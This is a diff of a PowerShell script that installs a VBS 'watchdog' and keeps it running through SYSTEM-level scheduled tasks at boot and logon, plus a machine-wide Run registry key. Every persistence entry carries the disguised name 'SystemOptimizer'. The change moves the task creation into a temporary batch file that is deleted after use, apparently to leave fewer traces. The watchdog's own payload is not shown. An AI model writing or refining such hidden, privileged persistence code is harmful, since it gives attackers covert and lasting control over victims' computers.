@@ -86,8 +86,14 @@ $wd | Out-File -FilePath $watchdogPath -Encoding ascii
 if (-not (Test-Path $watchdogPath)) { throw "Watchdog.vbs not created at $watchdogPath" }
 
 # ===== SCHEDULED TASKS (SYSTEM, boot + logon) =====
-$taskCmd = "schtasks /Create /TN SystemOptimizer /TR \"wscript.exe `"$watchdogPath`\"\" /SC ONSTART /RU SYSTEM /RL HIGHEST /F; schtasks /Create /TN SystemOptimizer-Logon /TR \"wscript.exe `"$watchdogPath`\"\" /SC ONLOGON /RU SYSTEM /RL HIGHEST /F; schtasks /Change /TN SystemOptimizer /RI 1 /DU 9999:59 /K"
-Start-Process cmd -ArgumentList "/c $taskCmd" -Verb RunAs -Wait
+$tempCmd = "$env:TEMP\create_tasks.cmd"
+@"
+schtasks /Create /TN SystemOptimizer /TR "wscript.exe \"$watchdogPath\"" /SC ONSTART /RU SYSTEM /RL HIGHEST /F
+schtasks /Create /TN SystemOptimizer-Logon /TR "wscript.exe \"$watchdogPath\"" /SC ONLOGON /RU SYSTEM /RL HIGHEST /F
+schtasks /Change /TN SystemOptimizer /RI 1 /DU 9999:59 /K
+"@ | Set-Content -Path $tempCmd -Encoding ascii
+Start-Process cmd -ArgumentList "/c $tempCmd" -Verb RunAs -Wait
+Remove-Item $tempCmd -Force -ErrorAction SilentlyContinue
 
 # ===== REGISTRY RUN KEY =====
 try { Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" -Name "SystemOptimizer" -Value "wscript.exe `"$watchdogPath`"" -Force -ErrorAction SilentlyContinue } catch { }
